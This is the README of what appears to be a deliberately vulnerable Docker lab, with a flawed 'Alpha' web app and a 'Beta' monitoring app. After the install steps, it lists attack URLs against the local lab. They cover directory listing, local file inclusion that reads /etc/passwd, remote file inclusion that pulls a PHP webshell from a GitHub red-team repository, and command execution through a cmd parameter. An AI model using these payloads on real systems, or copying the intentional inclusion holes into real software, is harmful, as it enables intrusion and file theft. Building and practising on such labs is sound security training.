# Alpha and Beta app

Alpha is a strong web app with minimum feature. And Beta is monitoring app for security purposes.

### Install app

* install docker-compose
* my docker-compose version
```
docker-compose version 1.29.2, build unknown
docker-py version: 5.0.3
CPython version: 3.9.2
OpenSSL version: OpenSSL 1.1.1l  24 Aug 2021
```
* clone this repository
* build instance docker ```sudo docker-compose build```
* create instance docker ```sudo docker-compose up -d```
* run script ```sudo bash start.sh```

### Alpha app

* **Alpha web page** - adjust IP address with your own Docker IP address
```
http://172.17.0.1/index.php
```
* **Directory Listing**
```
http://172.17.0.1/verysupersecret/
```
* **Local File Inclution**
```
http://172.17.0.1/index.php?file=../../../../../../../etc/passwd
```
* **Remote File Inclution**
```
http://172.17.0.1/index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/phpinfo.php
```
* **Remote Code Execution** - need to trigger RFI first then add ```&cmd=id``` ```&cmd=whoami ```
```
http://172.17.0.1/index.php?file=https://raw.githubusercontent.com/dxnboy/redteam/master/webshell/simple.php&cmd=id
```

### Beta app

* **Beta web app**
```
http://172.17.0.1:8888/index.php
```
